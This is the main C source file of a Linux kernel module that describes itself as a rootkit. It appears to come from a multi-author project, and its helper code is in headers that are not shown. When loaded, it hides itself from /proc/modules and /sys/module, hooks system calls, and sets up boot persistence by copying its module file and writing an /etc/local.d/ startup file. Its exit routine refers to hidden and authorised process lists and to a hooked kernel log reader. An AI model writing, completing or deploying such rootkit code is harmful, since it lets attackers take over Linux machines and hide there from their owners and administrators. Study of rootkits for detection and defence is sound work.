#include "rootkit_main.h"

#include "constants.h"
#include "hooking.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

MODULE_ALIAS(MOD_ALIAS);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1]");
MODULE_AUTHOR("[AUTHOR 2]");
MODULE_AUTHOR("[AUTHOR 3]");
MODULE_AUTHOR("[AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.9");

static int __init rootkit_init(void)
{
    int i32_err;

    pr_dev_info("Module loading...\n");
    pr_dev_info("* Module: %s (v%s)\n", THIS_MODULE->name, THIS_MODULE->version);

    // Initialize hooking
    i32_err = init_hooking();

    IF_U (i32_err != 0) {
        pr_dev_err("Failed to initialize hooking\n");
        return i32_err;
    }

    // Hide the rootkit from /proc/modules and /sys/module/
    hide_module();

    hook_syscalls(P_SYSCALL_HOOKS);

    i32_err = copy_module_file();
    IF_U (i32_err != 0) {
        pr_dev_err("Failed to copy module file\n");
    }
    else {
        i32_err = create_locald_file();
        IF_U (i32_err != 0) {
            pr_dev_err("Failed to create /etc/local.d/ file\n");
        }
    }

    pr_dev_info("Module loaded\n");
    return 0;
}

static __exit void rootkit_exit(void)
{
    // Restore original syscall functions
    unhook_syscalls(P_SYSCALL_HOOKS);

    // Clear the list of hidden PIDs
    show_all_processes();

    // Clear the list of authorized PIDs
    clear_auth_list();

    // Restore the original `kmsg_read()` function
    restore_kmsg_read();

    pr_dev_info("Module unloaded\n");
    return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
